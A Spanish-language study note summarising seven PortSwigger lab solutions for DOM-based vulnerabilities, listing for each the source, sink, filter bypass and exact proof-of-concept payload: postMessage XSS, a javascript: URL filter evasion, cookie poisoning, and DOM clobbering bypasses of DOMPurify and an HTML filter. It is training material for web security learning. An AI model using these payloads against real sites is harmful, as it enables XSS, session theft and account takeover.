---
aliases:
  - DOM-based labs
  - dom-based-labs
tags:
  - vuln/dom-based
  - labs
  - portswigger
---

# DOM-based vulnerabilities — Labs de PortSwigger

Labs de la categoría **DOM-based vulnerabilities** (la que está **aparte** de XSS en [all-labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)): web messages, open redirect, cookie manipulation y DOM clobbering. No hay Apprentice en esta categoría.

> Los labs de **DOM-XSS "clásico"** (`location.search`→`innerHTML`, `document.write`, jQuery, AngularJS…) están en [[vulnerabilities/002-xss/labs/README|los labs de XSS]]. Acá va lo que **no es** "reflejo directo en una página".

> **Cómo leer las columnas:** **Source** = dato que controlás · **Sink** = dónde cae sin sanitizar · **Twist/obfuscación** = el filtro a sortear · **Se obtiene** = PoC (`print()`/`alert`) vs. impacto real (XSS→cookie/ATO, redirect→token). Metodología y plantillas → [[vulnerabilities/025-dom-based/dom-based|entry point]].

## Practitioner

| #   | Laboratorio | Source → Sink | Twist / obfuscación | Se obtiene · cómo se arma |
| --- | ----------- | ------------- | ------------------- | ------------------------- |
| 1 | [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages) | web message (`e.data`) → **`innerHTML`** (div `ads`) | ninguno; `addEventListener('message')` **sin chequear `origin`** | **XSS** (`print()`). `innerHTML` **no corre `<script>`** → `<img src=1 onerror=print()>`. Iframe en el exploit server que en `onload` hace `postMessage('<img …>','*')`. |
| 2 | [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url) | web message → **`location.href`** | **filtro `indexOf('http:')`** sobre el mensaje (busca `http:`/`https:` en cualquier lado) | **XSS**. Se **burla el filtro con un comentario**: `postMessage('javascript:print()//http:','*')` → contiene `http:` (pasa el check) pero ejecuta el `javascript:`. |
| 3 | [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse) | web message → `JSON.parse(e.data)` → **`iframe.src`** (`ACMEplayer.element`) | el mensaje debe ser **JSON válido** con `type:"load-channel"` (switch) | **XSS**. `postMessage('{"type":"load-channel","url":"javascript:print()"}','*')` → la `url` cae en el `src` del iframe. Sin origin check + `targetOrigin='*'`. |
| 4 | [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection) | `location` (param `url`, regex `/url=https?:\/\/.+/`) → **`location.href`** | ninguno (solo hay que respetar el `https://` que pide el regex) | **Open redirect** (PoC: redirige al exploit server). **Solo una URL:** `…/post?postId=4&url=https://EXPLOIT.exploit-server.net/`. Real: robar **token/`code`** en flujos OAuth → [[vulnerabilities/026-oauth/oauth#1) redirect_uri no validado → robar el code del admin\|OAuth: redirect_uri]]. |
| 5 | [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation) | URL → **`document.cookie`** (`lastViewedProduct`) → luego se **escribe en el HTML** | la cookie se setea en una carga y se **usa en la siguiente** | **XSS "vía cookie"**. Iframe carga `…/product?productId=1&'><script>print()</script>` → **envenena** la cookie; en `onload` redirige al home (`if(!window.x)…`) donde la cookie se pinta → ejecuta. |

## Expert — DOM clobbering

| #   | Laboratorio | Qué se clobbea | Twist / obfuscación | Se obtiene · cómo se arma |
| --- | ----------- | -------------- | ------------------- | ------------------------- |
| 6 | [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering) | global `window.defaultAvatar \|\| {avatar:…}` | **DOMPurify** filtra, **pero** permite el protocolo **`cid:`** que **no URL-encodea las comillas dobles** | **XSS** (`alert(1)`). En un comentario: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`. Un **2º comentario** recarga la página y usa la global ya clobbeada. |
| 7 | [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters) | la **propiedad `attributes`** del propio elemento (su `.length` queda `undefined`) | la librería filtra recorriendo `element.attributes` → clobbeando `attributes` el filtro **deja pasar** atributos arbitrarios | **XSS** (`print()`). Comentario: `<form id=x tabindex=0 onfocus=print()><input id=attributes>`. Iframe que tras 500ms hace `this.src+='#x'` → **focus** en el form → `onfocus`. |

---

## Atajos mentales / patrones

- **3 de 7 son web messages** → la firma es `addEventListener("message", …)` **sin chequear `event.origin`**. El payload siempre es un **`<iframe>` en el exploit server** que hace `postMessage(...)` en `onload`.
  - sink `innerHTML` → `<img src=1 onerror=…>` (no `<script>`).
  - sink `location.href` con filtro `http:` → `javascript:…//http:`.
  - pasa por `JSON.parse` → mandá **JSON válido**.
- **Open redirect DOM** = source `location` → sink `location.href`. **No es XSS**: su valor real es **robar tokens** en OAuth/SSO (`redirect_uri`). A veces solo es una **URL**, sin exploit server.
- **Cookie manipulation** = envenenás `document.cookie` en una carga y el valor se **usa como sink** en la siguiente → truco del **iframe que se recarga** (`onload` redirige).
- **DOM clobbering** (Expert) = **no ejecutás JS**: metés `<a>`/`<form>` con `id`/`name` que **pisan una variable global** que el JS usa mal (`window.x || {}`). Aparece cuando hay **DOMPurify** u otro filtro que **deja pasar `id`/`name`**. Los dos trucos: **`cid:` de DOMPurify** (no encodea `"`) y **clobbear `attributes`** para romper el filtro.
- **Herramienta:** **DOM Invader** encuentra las cadenas source→sink y tiene módulo **postMessage** para 1-3.
- **Todo se entrega por exploit server** (excepto open redirect, que puede ser una URL directa). Confirmá la visita de la víctima por el **Access log**.
